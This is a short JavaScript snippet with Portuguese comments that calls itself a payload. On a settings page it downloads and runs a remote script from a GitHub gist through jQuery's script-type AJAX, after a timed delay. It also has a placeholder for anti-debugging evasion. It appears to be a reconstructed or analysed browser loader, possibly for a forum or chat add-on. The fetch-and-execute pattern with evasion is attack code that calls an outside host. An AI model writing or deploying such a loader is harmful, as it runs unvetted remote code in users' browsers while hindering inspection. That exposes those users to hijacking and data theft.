(function() {
    // Função principal que executa o payload
    function executePayload() {
        if (window.location.href.includes('mode=index&settings')) {
            window['dn'] = true;
            
            // Configuração para baixar script remoto
            const scriptConfig = {
                type: 'GET',
                url: 'https://gist.githubusercontent.com/KumJiee96/02f1d4baae25a27d0bcf/raw/Discord%20No%20Mercy%20Notification%20Tools.js',
                dataType: 'script',
                cache: false
            };
            
            // Faz requisição AJAX para baixar e executar o script
            $.ajax(scriptConfig);
        }
    }

    // Técnicas anti-debugging
    function antiDebugging() {
        // Código que tenta detectar e impedir debugging
        // ...
    }

    // Executa após um delay
    setTimeout(executePayload, 2000);
})();
